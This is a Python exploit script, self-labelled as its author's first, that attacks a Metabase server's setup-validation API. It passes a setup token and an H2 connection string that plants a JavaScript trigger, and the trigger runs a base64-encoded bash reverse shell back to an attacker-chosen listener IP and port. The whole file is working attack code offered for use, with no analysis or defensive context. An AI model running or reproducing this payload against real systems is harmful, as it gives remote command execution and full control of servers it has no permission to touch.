import argparse
import requests
import base64
import json

print("My first exploit script =======> Mario <=======\n")

parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", type=str, required=True, help="Target URL to test")
parser.add_argument("-t", "--token", type=str, required=True, help="Get the setup token. Found at /api/session/properties.")
parser.add_argument("-l", "--listener_ip", type=str, required=True, help="listener ip")
parser.add_argument("-p", "--listener_port", type=str, required=True, help="listener port")
args = parser.parse_args()


payload = base64.b64encode(f"bash -c 'bash -i >& /dev/tcp/{args.listener_ip}/{args.listener_port} 0>&1'".encode()).decode()

print(payload)

endpoint = "/api/setup/validate"

headers = {'Content-Type': 'application/json'}

data = {
        "token": args.token,
        "details": {
            # "is_on_demand": False,
            # "is_full_sync": False,
            # "is_sample": False,
            # "cache_ttl": None,
            # "refingerprint": False,
            # "auto_run_queries": True,
            # "schedules": {},
            "details": {
                "db": f"zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x",
                "advanced-options": False,
                "ssl": True
            },
            "name": "test",
            "engine": "h2"
        }
    }


print(f"[+] Sending request to {args.url}{endpoint}")
print(json.dumps(data, indent=4))
try:
	response = requests.post(f'{args.url}{endpoint}', headers=headers, json=data, verify=False)

	#print(f"[+] the request : {request.text}")
	print(f"[+] Response recevied: {response.text}")

	if response.status_code == 200:
		print(f"Payloud is Successfully executed!!")
	else:
		print(f"Failed with status {response.status_code}")

except requests.exceptions.RequestException as e:
	print(f"exceptions: {e}")